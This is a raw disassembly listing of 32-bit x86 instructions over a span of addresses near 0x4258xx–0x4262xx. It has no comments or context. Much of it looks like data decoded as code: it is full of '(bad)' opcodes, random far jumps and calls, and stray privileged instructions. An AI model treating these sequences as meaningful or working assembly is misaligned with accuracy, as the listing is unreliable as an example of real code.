  425859:	inc    ebp
  42585a:	mov    bh,0xb9
  42585c:	lock dec edx
  42585e:	mov    bl,0x35
  425860:	push   ecx
  425861:	jnp    0x42586d
  425863:	jo     0x4257f4
  425865:	repnz xchg esi,eax
  425867:	xor    BYTE PTR [edx+eax*8+0x69],0xc8
  42586c:	lods   al,BYTE PTR ds:[esi]
  42586d:	mov    ebp,0xc53408ce
  425872:	sti    
  425873:	lds    ebp,FWORD PTR [eax]
  425875:	mov    al,BYTE PTR [edi+0x7d]
  425878:	inc    edx
  425879:	fwait
  42587a:	xor    bh,ah
  42587c:	(bad)  
  42587d:	mov    edx,0x2894d358
  425882:	(bad)  
  425883:	imul   edi,eax,0x36
  425886:	enter  0x6e93,0xf0
  42588a:	and    ebp,DWORD PTR [ecx-0x1116bdd]
  425890:	mov    edi,0x0
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	ja     0x425910
  425902:	es (bad) 
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	js     0x4258f4
  42590e:	(bad)  
  42590f:	scas   al,BYTE PTR es:[edi]
  425910:	pop    es
  425911:	xor    BYTE PTR [eax+ebp*4+0x40],0x2e
  425916:	ret    0xa0fa
  425919:	mov    ah,0x74
  42591b:	add    al,0xcb
  42591d:	int3   
  42591e:	lock or dh,bl
  425921:	jmp    0xeab8:0x53caf0d6
  425928:	retf   
  425929:	popf   
  42592a:	idiv   BYTE PTR [ebp-0x6e]
  42592d:	xchg   edi,eax
  42592e:	pusha  
  42592f:	and    DWORD PTR [eax],0x8adf413e
  425935:	mov    dh,0x98
  425937:	sbb    esp,DWORD PTR [ecx]
  425939:	sbb    ch,dh
  42593b:	int    0x5b
  42593d:	scas   al,BYTE PTR es:[edi]
  42593e:	xor    DWORD PTR [edi],esp
  425940:	call   0x84909c3a
  425945:	out    dx,al
  425946:	cwde   
  425947:	sub    BYTE PTR [ebp+0x23],al
  42594a:	add    dh,BYTE PTR [ecx-0x28]
  42594d:	push   edi
  42594e:	jb     0x425981
  425950:	out    0xff,eax
  425952:	fidivr DWORD PTR [eax*2-0x71861f7c]
  425959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42595a:	fcom   QWORD PTR [esp+ebp*4+0x36]
  42595e:	adc    BYTE PTR [esi+0x35],ch
  425961:	ret    
  425962:	pop    esp
  425963:	(bad)  [ebx]
  425965:	popf   
  425966:	dec    ebx
  425967:	fs pop ds
  425969:	dec    edi
  42596a:	add    DWORD PTR [ebx-0x62],esi
  42596d:	sar    DWORD PTR [esi],cl
  42596f:	addr16 (bad) 
  425971:	icebp  
  425972:	inc    ebx
  425973:	scas   al,BYTE PTR es:[edi]
  425974:	std    
  425975:	lock ins BYTE PTR es:[edi],dx
  425977:	fst    st(3)
  425979:	mov    al,ds:0x973694eb
  42597e:	dec    edi
  42597f:	(bad)  
  425980:	clc    
  425981:	mov    al,ds:0x4a727833
  425986:	sbb    ebx,DWORD PTR ds:0xdd3c9d07
  42598c:	xchg   BYTE PTR [eax],dl
  42598e:	repnz shl dl,0x68
  425992:	adc    eax,0xa2ed857a
  425997:	das    
  425998:	jbe    0x4259fd
  42599a:	mov    edx,ds
  42599c:	rcl    BYTE PTR [ecx-0x8],1
  42599f:	dec    ebx
  4259a0:	dec    ebx
  4259a1:	(bad)  
  4259a2:	adc    DWORD PTR [esi],ebx
  4259a4:	sbb    DWORD PTR [ecx+0x334b992],eax
  4259aa:	pop    ss
  4259ab:	push   ss
  4259ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259ad:	mov    al,ds:0x444a7efe
  4259b2:	mov    dh,0x7e
  4259b4:	jecxz  0x425a34
  4259b6:	jmp    0xa38d422a
  4259bb:	or     DWORD PTR [ecx-0x4306bce],edx
  4259c1:	icebp  
  4259c2:	stos   BYTE PTR es:[edi],al
  4259c3:	push   0x671d303f
  4259c8:	call   0xd712:0x65f418c5
  4259cf:	and    BYTE PTR [eax+ecx*8+0x57c0990a],bl
  4259d6:	mov    bl,0x95
  4259d8:	int    0x81
  4259da:	out    0xc,al
  4259dc:	jp     0x42598c
  4259de:	xchg   ebx,eax
  4259df:	and    edx,DWORD PTR [edi-0x8542a26]
  4259e5:	jle    0xc433b271
  4259eb:	aaa    
  4259ec:	imul   edx,DWORD PTR [ecx-0x3a],0xffffffe4
  4259f0:	mov    DWORD PTR [edx-0x6f],edi
  4259f3:	push   esp
  4259f4:	xor    al,0x95
  4259f6:	bound  esi,QWORD PTR [eax-0x45]
  4259f9:	mov    edx,0xa840f593
  4259fe:	or     BYTE PTR [edi+0x290a2e88],dl
  425a04:	loopne 0x4259da
  425a06:	pop    ds
  425a07:	in     eax,0xdb
  425a09:	push   ecx
  425a0a:	sbb    cl,ch
  425a0c:	loop   0x4259ba
  425a0e:	sbb    eax,DWORD PTR [ebp-0x69]
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x90a1bcf]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	sbb    ebp,DWORD PTR [edi+0x1dcf9eb3]
  425a92:	dec    ebx
  425a93:	add    BYTE PTR [eax+0x7c],ah
  425a96:	stos   BYTE PTR es:[edi],al
  425a97:	lea    eax,[edx+0x5b]
  425a9a:	mov    ds:0x6da62bd3,eax
  425a9f:	jecxz  0x425b1d
  425aa1:	jl     0x425aa2
  425aa3:	call   esp
  425aa5:	sbb    dh,al
  425aa7:	jae    0x425a7d
  425aa9:	iret   
  425aaa:	daa    
  425aab:	or     ah,al
  425aad:	cs add edx,edx
  425ab0:	push   ecx
  425ab1:	std    
  425ab2:	cmp    DWORD PTR [eax+0x2d100cc8],eax
  425ab8:	sbb    DWORD PTR ds:0xb7e8c9f8,ecx
  425abe:	inc    edi
  425abf:	es push esp
  425ac1:	xlat   BYTE PTR ds:[ebx]
  425ac2:	dec    esp
  425ac3:	fwait
  425ac4:	mov    WORD PTR [ebp-0x67ce4a88],gs
  425aca:	mov    ebp,0xe1284db1
  425acf:	xor    edi,edi
  425ad1:	jno    0x425a7e
  425ad3:	pop    edi
  425ad4:	scas   al,BYTE PTR es:[edi]
  425ad5:	cwde   
  425ad6:	fcmovnu st,st(7)
  425ad8:	not    DWORD PTR [esi+0x68bbfc13]
  425ade:	jmp    0xd3eeb91a
  425ae3:	(bad)  
  425ae4:	adc    DWORD PTR [ebx+0x691e67f7],esp
  425aea:	sbb    BYTE PTR [edi-0x749569ae],0x3a
  425af1:	aaa    
  425af2:	or     ecx,DWORD PTR [eax]
  425af4:	mov    ds:0x74708e3f,eax
  425af9:	adc    ebx,ebp
  425afb:	fstp   QWORD PTR [edi]
  425afd:	mov    edi,0x75357b01
  425b02:	stc    
  425b03:	or     al,0x7a
  425b05:	xor    ebp,DWORD PTR [eax+0x3d486da3]
  425b0b:	xor    al,0x1d
  425b0d:	dec    esp
  425b0e:	pop    edx
  425b0f:	clc    
  425b10:	bound  edx,QWORD PTR [ebx+ebx*1+0x27]
  425b14:	mov    es,WORD PTR [eax+0x22]
  425b17:	popf   
  425b18:	out    0x2,eax
  425b1a:	rcr    DWORD PTR [eax-0xb],0xf8
  425b1e:	mov    cl,0x5f
  425b20:	xchg   ebp,eax
  425b21:	out    0x94,eax
  425b23:	mov    ebx,0xfed045e
  425b28:	(bad)  
  425b29:	mov    ds:0xa76f5a9a,eax
  425b2e:	dec    edi
  425b2f:	dec    esi
  425b30:	out    0xfc,eax
  425b32:	dec    eax
  425b33:	test   al,0x94
  425b35:	test   al,0x41
  425b37:	ret    
  425b38:	fwait
  425b39:	jl     0x425b81
  425b3b:	addr16 push es
  425b3d:	mov    ebp,0x4333ff59
  425b42:	mov    esp,0x51d6d6d
  425b47:	fidiv  WORD PTR [edx+0x5a24a935]
  425b4d:	sar    BYTE PTR [ecx+0x0],0x5a
  425b51:	inc    edx
  425b52:	sub    DWORD PTR [esi-0x6cc4a9c],ebp
  425b58:	and    al,0x5b
  425b5a:	pop    edx
  425b5b:	add    DWORD PTR [ecx],edx
  425b5d:	inc    ecx
  425b5e:	mov    ebp,0xbb427daa
  425b63:	aaa    
  425b64:	inc    esp
  425b65:	std    
  425b66:	icebp  
  425b67:	(bad)  
  425b68:	pop    esp
  425b69:	jle    0x425b13
  425b6b:	push   ebp
  425b6c:	pusha  
  425b6d:	inc    ecx
  425b6e:	sub    BYTE PTR [ecx-0x1c],cl
  425b71:	lock loop 0x425b5b
  425b74:	out    0x3d,eax
  425b76:	push   esp
  425b77:	out    dx,eax
  425b78:	sbb    al,0xe1
  425b7a:	xor    BYTE PTR [esi+0x4b9d6323],cl
  425b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b81:	xor    DWORD PTR [ebp-0x2260b43b],0xffffffee
  425b88:	cmp    dl,dl
  425b8a:	pushf  
  425b8b:	pop    ecx
  425b8c:	psrad  mm6,QWORD PTR [ebx+0x4b17]
	...
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	push   0x38
  425c02:	add    ecx,DWORD PTR [edx+edx*4-0x6d]
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x1
  425c0d:	jbe    0x425c5c
  425c0f:	pushf  
  425c10:	(bad)  
  425c11:	xor    BYTE PTR cs:[ecx+edi*1],bh
  425c15:	mov    ah,0x29
  425c17:	loop   0x425c31
  425c19:	sub    DWORD PTR [ebx-0x34],esi
  425c1c:	jl     0x425ba3
  425c1e:	cli    
  425c1f:	(bad)  
  425c20:	mov    eax,edi
  425c22:	stos   DWORD PTR es:[edi],eax
  425c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c24:	leave  
  425c25:	pop    edx
  425c26:	push   0xa4f7eabc
  425c2b:	mov    al,BYTE PTR [eax-0x77efdaa5]
  425c31:	mov    edi,0xb90c3790
  425c36:	hlt    
  425c37:	(bad)
  425c3b:	mov    ds:0xa68a55ab,al
  425c40:	pop    esp
  425c41:	call   0x760f:0x72198d25
  425c48:	mov    al,ds:0x9d235347
  425c4d:	mov    DWORD PTR [ebp+0x4a8980d4],ebx
  425c53:	mov    ch,dh
  425c55:	fisttp WORD PTR [ecx-0x40fd40ff]
  425c5b:	sbb    DWORD PTR [ecx],ebp
  425c5d:	out    0xb0,al
  425c5f:	mov    al,0x44
  425c61:	xor    DWORD PTR [esi+0x7f],ecx
  425c64:	and    bl,bh
  425c66:	mov    cl,0x6d
  425c68:	fucom  st(5)
  425c6a:	dec    ebx
  425c6b:	jbe    0x425c45
  425c6d:	into   
  425c6e:	in     eax,dx
  425c6f:	shl    DWORD PTR [eax+eiz*1+0x6d],cl
  425c73:	icebp  
  425c74:	inc    edi
  425c75:	push   edi
  425c76:	jmp    DWORD PTR [ecx]
  425c78:	aam    0xb
  425c7a:	mov    bh,BYTE PTR [ecx+0x75]
  425c7d:	jp     0x425c2d
  425c7f:	gs inc edx
  425c81:	data16 int 0xc5
  425c84:	adc    DWORD PTR [eax+0x26],esi
  425c87:	aam    0x78
  425c89:	ficom  WORD PTR [edi+0x7350b78d]
  425c8f:	scas   eax,DWORD PTR es:[edi]
  425c90:	xchg   ebx,eax
  425c91:	adc    DWORD PTR [edx-0x782ae890],ebp
  425c97:	mov    dh,0x40
  425c99:	pusha  
  425c9a:	push   ebx
  425c9b:	mov    bl,0x4e
  425c9d:	or     BYTE PTR [ecx],cl
  425c9f:	imul   edx,DWORD PTR [edx-0x21],0xffffffb5
  425ca3:	cld    
  425ca4:	idiv   DWORD PTR [ebx+0x12]
  425ca7:	mov    bl,0xf9
  425ca9:	and    DWORD PTR [esi+0x59711a51],esp
  425caf:	jb     0x425c3b
  425cb1:	popf   
  425cb2:	adc    BYTE PTR [esi],dl
  425cb4:	leave  
  425cb5:	fadd   DWORD PTR [ebx]
  425cb7:	outs   dx,DWORD PTR ds:[esi]
  425cb8:	push   eax
  425cb9:	push   eax
  425cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cbb:	cdq    
  425cbc:	clc    
  425cbd:	mov    ebx,0xc26f2733
  425cc2:	and    cl,BYTE PTR [ebx+0x70732de8]
  425cc8:	test   DWORD PTR [ebx],0x5613db1c
  425cce:	dec    eax
  425ccf:	test   al,0x38
  425cd1:	stos   WORD PTR es:[edi],ax
  425cd3:	lods   al,BYTE PTR ds:[esi]
  425cd4:	push   0x7d
  425cd6:	add    al,0xde
  425cd8:	jmp    0xf5d:0xa96f879f
  425cdf:	jg     0x425c99
  425ce1:	sbb    DWORD PTR [eax+0x477fa89d],eax
  425ce7:	lock pushf 
  425ce9:	or     DWORD PTR [ebp+ecx*8+0x51],ebx
  425ced:	stc    
  425cee:	mov    dh,0xe0
  425cf0:	or     eax,0x5b49fb88
  425cf5:	stc    
  425cf6:	adc    DWORD PTR ds:0xf123e920,ebx
  425cfc:	add    al,0xe1
  425cfe:	cld    
  425cff:	cmp    dh,ch
  425d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d02:	fld    QWORD PTR [edi+0x44]
  425d05:	sbb    edi,DWORD PTR [edi+0x25a0b7a9]
  425d0b:	fst    DWORD PTR [edx-0x1c5e01f0]
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x66bef98f,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x1e000001
  425d8d:	adc    al,0xa3
  425d8f:	mov    DWORD PTR cs:[eax+edx*8],esi
  425d93:	cli    
  425d94:	imul   ebx,DWORD PTR [edi+0x30],0xcb5c2b6d
  425d9b:	push   es
  425d9c:	shl    BYTE PTR [ebp+0x624ae359],1
  425da2:	gs int3 
  425da4:	and    bh,dh
  425da6:	scas   al,BYTE PTR es:[edi]
  425da7:	mov    bl,0x93
  425da9:	pop    ecx
  425daa:	add    al,0x59
  425dac:	daa    
  425dad:	xor    edi,edi
  425daf:	or     eax,0x7bb8628b
  425db4:	xor    BYTE PTR [esi+0x2b15ad8d],bl
  425dba:	mov    ds:0x8d703859,eax
  425dbf:	retf   0x6895
  425dc2:	pop    ds
  425dc3:	mov    dl,0xf
  425dc5:	out    dx,eax
  425dc6:	xchg   edx,eax
  425dc7:	fsubr  st(6),st
  425dc9:	rol    DWORD PTR [eax-0x14a6b9d0],cl
  425dcf:	sar    BYTE PTR [ebx-0x72],0xd8
  425dd3:	jecxz  0x425d86
  425dd5:	sbb    BYTE PTR [edx],0x35
  425dd8:	mov    WORD PTR [eax+0x17],cs
  425ddb:	adc    BYTE PTR [ecx+0x5c4c3aac],al
  425de1:	push   0x13
  425de3:	xor    edi,ecx
  425de5:	jp     0x425db7
  425de7:	mov    eax,ds:0x747e265
  425dec:	or     eax,0x312364b
  425df1:	out    0xb1,eax
  425df3:	aas    
  425df4:	dec    ebx
  425df5:	push   edi
  425df6:	cli    
  425df7:	pop    ss
  425df8:	and    ebp,DWORD PTR [eax+0x35]
  425dfb:	ror    DWORD PTR [eax+edx*4+0x56],cl
  425dff:	stos   BYTE PTR es:[edi],al
  425e00:	sub    eax,0x25ae8a36
  425e05:	cmp    cl,BYTE PTR [esi+0x19f4ebdc]
  425e0b:	jae    0x425ddb
  425e0d:	xor    BYTE PTR [eax-0x17a20d16],bl
  425e13:	sub    al,0x58
  425e15:	retf   0x6dea
  425e18:	repnz stos DWORD PTR es:[edi],eax
  425e1a:	(bad)  
  425e1b:	pop    ds
  425e1c:	pop    ds
  425e1d:	aam    0x35
  425e1f:	jle    0x425ddc
  425e21:	ja     0x425e8f
  425e23:	or     BYTE PTR [ebx+0x4e],ah
  425e26:	jne    0x425de9
  425e28:	inc    edi
  425e29:	mov    ebp,0x59f728c4
  425e2e:	(bad)  
  425e2f:	stos   DWORD PTR es:[edi],eax
  425e30:	jb     0x425e1d
  425e32:	clc    
  425e33:	outs   dx,BYTE PTR ds:[esi]
  425e34:	jmp    0x425e28
  425e36:	fdiv   QWORD PTR [eax]
  425e38:	mov    bl,0xb8
  425e3a:	cmp    eax,0x5427fe73
  425e3f:	dec    edx
  425e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e41:	iret   
  425e42:	add    al,ch
  425e44:	lods   al,BYTE PTR ds:[esi]
  425e45:	cmp    edx,DWORD PTR [eax-0x4e]
  425e48:	pop    ebx
  425e49:	xchg   esi,eax
  425e4a:	fs mov ecx,0xc7d03bd6
  425e50:	mov    edi,ebp
  425e52:	sbb    eax,0x7fce7d6a
  425e57:	mov    edi,0x87050a5e
  425e5c:	and    eax,0x54887f1e
  425e61:	inc    edx
  425e62:	iret   
  425e63:	add    BYTE PTR [eax+0x7d],cl
  425e66:	push   ebp
  425e67:	inc    ebx
  425e68:	arpl   WORD PTR [ebp-0xe],di
  425e6b:	cmp    dh,al
  425e6d:	(bad)  
  425e6e:	mov    edi,0x6a4fd1bc
  425e73:	(bad)  
  425e74:	mov    dl,0x8a
  425e76:	lods   al,BYTE PTR ds:[esi]
  425e77:	jo     0x425e3e
  425e79:	lods   eax,DWORD PTR ds:[esi]
  425e7a:	inc    ebp
  425e7b:	cmp    al,0xf6
  425e7d:	test   al,0x7d
  425e7f:	xchg   BYTE PTR [ebx+0x66],ch
  425e82:	std    
  425e83:	test   eax,0x93e1ea93
  425e88:	fisub  DWORD PTR es:[edx+0x8]
  425e8c:	jge    0x425e3d
  425e8e:	add    bh,0xbd
	...
  425ef1:	add    BYTE PTR [eax],al
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	cli    
  425f01:	mov    ah,BYTE PTR [edx]
  425f03:	jl     0x425ea1
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0x2000001
  425f0d:	outs   dx,DWORD PTR ss:[esi]
  425f0f:	(bad)  
  425f10:	mov    eax,0xd7745044
  425f15:	mov    ebx,ebx
  425f17:	pop    esi
  425f18:	jecxz  0x425f64
  425f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f1b:	mov    DWORD PTR [edi-0x34],edx
  425f1e:	aam    0x53
  425f20:	stos   BYTE PTR es:[edi],al
  425f21:	cmp    eax,0x9d98565f
  425f26:	arpl   WORD PTR [ecx+ebx*4+0x6a],ax
  425f2a:	cld    
  425f2b:	shl    DWORD PTR ds:[edx+ebx*2-0x3f582204],1
  425f33:	jmp    0x5f8b:0xa13d469
  425f3a:	add    eax,0xb6a78e9a
  425f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f40:	xor    BYTE PTR [edi+0x4065a20c],bl
  425f46:	push   esp
  425f47:	fst    DWORD PTR [ebx]
  425f49:	mov    dl,0x56
  425f4b:	mov    bh,0xb6
  425f4d:	push   esp
  425f4e:	add    al,0xbb
  425f50:	in     al,dx
  425f51:	lock jmp 0xc98a:0x933e889d
  425f59:	mov    dh,0x90
  425f5b:	ss pop edx
  425f5d:	test   eax,0x795f4754
  425f62:	int    0xf2
  425f64:	jo     0x425efd
  425f66:	popf   
  425f67:	ret    
  425f68:	cwde   
  425f69:	pop    eax
  425f6a:	pop    eax
  425f6b:	sbb    al,0x47
  425f6d:	int3   
  425f6e:	mov    al,ds:0x1ebae187
  425f73:	push   eax
  425f74:	add    DWORD PTR [ecx-0x3d],ecx
  425f77:	enter  0xe495,0x3c
  425f7b:	std    
  425f7c:	mov    edx,0x73b98d0b
  425f81:	sub    ecx,eax
  425f83:	aaa    
  425f84:	inc    DWORD PTR [edi-0x7a]
  425f87:	fldenv [ebx+0x1a07443e]
  425f8d:	mov    edx,0x10bf060b
  425f92:	out    0xf3,eax
  425f94:	iret   
  425f95:	loope  0x425ffd
  425f97:	fisttp DWORD PTR [esi-0xf5988da]
  425f9d:	loopne 0x425fe1
  425f9f:	nop
  425fa0:	inc    eax
  425fa1:	pop    edi
  425fa2:	dec    eax
  425fa3:	xchg   al,bh
  425fa5:	or     ch,cl
  425fa7:	inc    ebp
  425fa8:	xor    BYTE PTR ds:0x753b28a6,ah
  425fae:	mul    eax
  425fb0:	mov    dh,BYTE PTR [esi-0x376e8eac]
  425fb6:	cmp    esi,DWORD PTR [eax+0x5f]
  425fb9:	xchg   dl,al
  425fbb:	cmp    DWORD PTR [ebx-0x19],0xffffffab
  425fbf:	jl     0x42600c
  425fc1:	fdivr  QWORD PTR [eax+edx*1-0x2d5df500]
  425fc8:	pop    edi
  425fc9:	mov    dl,0x51
  425fcb:	ficomp WORD PTR [ebp-0x7a]
  425fce:	in     eax,dx
  425fcf:	mov    ds:0xe02f0de1,eax
  425fd4:	or     BYTE PTR [esi+edx*1+0x56],bh
  425fd8:	jae    0x425ff5
  425fda:	(bad)
  425fde:	sar    DWORD PTR [ebp+0x444f7566],1
  425fe4:	cmp    BYTE PTR [edx+0x15accd99],bl
  425fea:	nop
  425feb:	ret    
  425fec:	sbb    DWORD PTR [ecx-0x614565a4],edx
  425ff2:	sahf   
  425ff3:	cmp    esi,DWORD PTR [esi*8-0x144b7bc5]
  425ffa:	or     ebp,edi
  425ffc:	and    DWORD PTR [edi+0x66],eax
  425fff:	fimul  DWORD PTR [esi]
  426001:	dec    edi
  426002:	sub    DWORD PTR [edi-0x23d5067b],edx
  426008:	mov    esp,DWORD PTR [edi-0x292f2659]
  42600e:	add    ebp,DWORD PTR [edi+ecx*2]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	sahf   
  426081:	sub    ah,BYTE PTR [edx+ebx*4-0x5f]
  426085:	xchg   esi,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0xde000001
  42608d:	mov    edi,0xa6793d0d
  426092:	xor    al,0xac
  426094:	stos   BYTE PTR es:[edi],al
  426095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426096:	clc    
  426097:	xabort 0x5f
  42609a:	push   cs
  42609b:	xor    al,0x87
  42609d:	mov    ecx,0x51940399
  4260a2:	inc    edx
  4260a3:	add    BYTE PTR [ebx],bl
  4260a5:	es jno 0x426074
  4260a8:	(bad)  
  4260a9:	adc    edx,DWORD PTR [edi-0x2b]
  4260ac:	xchg   ecx,eax
  4260ad:	test   DWORD PTR [edi-0x6f],edi
  4260b0:	push   cs
  4260b1:	xchg   esp,eax
  4260b2:	xchg   esi,eax
  4260b3:	ja     0x4260d8
  4260b5:	sbb    BYTE PTR [eax],0xaf
  4260b8:	jp     0x4260e3
  4260ba:	mov    esp,DWORD PTR [esi+0x7019512f]
  4260c0:	repnz (bad) 
  4260c2:	pop    eax
  4260c3:	retf   
  4260c4:	dec    esi
  4260c5:	mov    dh,0x6b
  4260c7:	jp     0x4260b6
  4260c9:	in     al,dx
  4260ca:	(bad)  
  4260cb:	ja     0x42612b
  4260cd:	push   ebx
  4260ce:	mov    bl,BYTE PTR [ebx-0x7205e715]
  4260d4:	pop    ebp
  4260d5:	rol    BYTE PTR ds:0x86bd9499,cl
  4260db:	or     eax,DWORD PTR [ebp-0x299a49e9]
  4260e1:	pusha  
  4260e2:	mov    ch,BYTE PTR [eax+eax*4-0x353d6897]
  4260e9:	sbb    BYTE PTR [eax],0xd6
  4260ec:	test   eax,0x4405f0c3
  4260f1:	inc    ebx
  4260f2:	cmp    dl,BYTE PTR [ebp+0x76]
  4260f5:	data16 fimul WORD PTR [edx-0x59]
  4260f9:	mov    esi,0x8f2ccf6c
  4260fe:	sub    eax,0x4e2e634b
  426103:	pop    esp
  426104:	dec    edx
  426105:	fxch   st(2)
  426107:	mov    bl,0xc
  426109:	xor    dh,BYTE PTR ds:[edx]
  42610c:	pusha  
  42610d:	stc    
  42610e:	mov    edi,0xedac8fd4
  426113:	fcom   QWORD PTR [esi-0x2ef024d5]
  42611a:	pop    esi
  42611b:	xchg   esi,eax
  42611c:	push   0x29
  42611e:	mov    bh,dl
  426120:	enter  0xc302,0x13
  426124:	icebp  
  426125:	xor    eax,0xb339c739
  42612a:	sub    BYTE PTR [ebx-0x4683e93e],bh
  426130:	add    esp,DWORD PTR [esi-0x1a]
  426133:	adc    BYTE PTR [eax+0x187dab50],dl
  426139:	and    ebx,DWORD PTR [ecx]
  42613b:	xor    al,0xec
  42613d:	xor    dh,BYTE PTR [esi]
  42613f:	loop   0x426191
  426141:	ds daa 
  426143:	fistp  WORD PTR [esi+0x9]
  426146:	xchg   ebp,eax
  426147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426148:	jns    0x4260fe
  42614a:	in     eax,dx
  42614b:	aad    0x60
  42614d:	xor    DWORD PTR [ebx+0xc06bbf1],eax
  426153:	arpl   WORD PTR [ebp+0x14],ax
  426156:	mov    BYTE PTR [ebp+0x35ca6931],bl
  42615c:	(bad)  
  42615d:	stos   DWORD PTR es:[edi],eax
  42615e:	aaa    
  42615f:	mov    cl,0x9d
  426161:	or     DWORD PTR [ebx+0x1b],edi
  426164:	mov    eax,ds:0x85c02238
  426169:	daa    
  42616a:	xchg   ebx,eax
  42616b:	ja     0x4260ee
  42616d:	sbb    al,0xae
  42616f:	es repnz sub eax,0x4f691b09
  426176:	outs   dx,BYTE PTR ds:[esi]
  426177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426178:	jbe    0x4261b4
  42617a:	inc    edi
  42617b:	mov    esi,0x30dd64d7
  426180:	jbe    0x42616f
  426182:	push   ebx
  426183:	jecxz  0x42617b
  426185:	and    al,0xf9
  426187:	mov    ds:0x343080b8,eax
  42618c:	push   0x65
  42618e:	xor    eax,0xc058
	...
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	fidivr DWORD PTR [esi+0x39]
  426203:	add    BYTE PTR [esi+0x5000197],ah
  426209:	add    DWORD PTR [eax],eax
  42620b:	add    BYTE PTR [eax+0x3983ae3e],dh
  426211:	rcr    DWORD PTR [ecx-0x3c],1
  426214:	mov    ebp,0x639cfccd
  426219:	inc    esi
  42621a:	xchg   esi,eax
  42621b:	sub    eax,0x370a22cf
  426220:	add    cl,BYTE PTR [ecx+0x3c]
  426223:	retf   0x9a4d
  426226:	outs   dx,BYTE PTR ds:[esi]
  426227:	add    BYTE PTR [ecx],0xe6
  42622a:	cmp    esi,DWORD PTR [ebx+eiz*4]
  42622d:	test   DWORD PTR [ebp-0x3f56d383],esi
  426233:	cmp    esi,esi
  426235:	inc    edi
  426236:	dec    ebp
  426237:	push   ds
  426238:	dec    edi
  426239:	rcl    BYTE PTR [edx],cl
  42623b:	jl     0x4261ed
  42623d:	fiadd  WORD PTR [ebp+0x680bda93]
  426243:	popa   
  426244:	loope  0x426283
  426246:	es nop
  426248:	jns    0x426286
  42624a:	jb     0x426239
  42624c:	clc    
  42624d:	scas   eax,DWORD PTR es:[edi]
  42624e:	pop    edi
  42624f:	jbe    0x4262a1
  426251:	and    eax,0xd5271acf
  426256:	ja     0x4262b2
  426258:	cmp    al,0x6f
  42625a:	in     al,dx
  42625b:	fild   DWORD PTR [eax-0x33807b51]
  426261:	adc    esi,DWORD PTR ds:[esi-0x4d]
  426265:	sbb    al,0x9
  426267:	or     DWORD PTR [edx-0x1e8f43e2],edx
  42626d:	xchg   ebp,eax
  42626e:	or     al,0xa6
  426270:	pop    ebp
  426271:	lea    edx,[esi*1-0x4b604b4b]
  426278:	push   cs
  426279:	dec    edi
  42627a:	xchg   ecx,eax
  42627b:	xor    bl,ah
  42627d:	dec    eax
  42627e:	inc    esp
  42627f:	xchg   ecx,eax
  426280:	ja     0x426250
  426282:	dec    edx
  426283:	cmp    DWORD PTR [ecx*2+0x37dce929],ebx
  42628a:	outs   dx,BYTE PTR ds:[esi]
  42628b:	pop    eax
  42628c:	retf   
  42628d:	jg     0x426291
  42628f:	pop    eax
  426290:	stos   BYTE PTR es:[edi],al
  426291:	retf   
  426292:	int    0x2f
  426294:	daa    
  426295:	retf   0xbd2b
  426298:	enter  0xd17c,0xaf
  42629c:	test   DWORD PTR [edx],esi
  42629e:	bound  ebx,QWORD PTR [eax-0x7ec39780]
  4262a4:	js     0x426261
  4262a6:	adc    dh,BYTE PTR [ebx+0x1966378]
  4262ac:	ja     0x426263
  4262ae:	fwait
  4262af:	ss jmp 0x37ba:0x170ec814
  4262b7:	mov    al,ds:0x3d1a2178
  4262bc:	enter  0x3656,0xc8
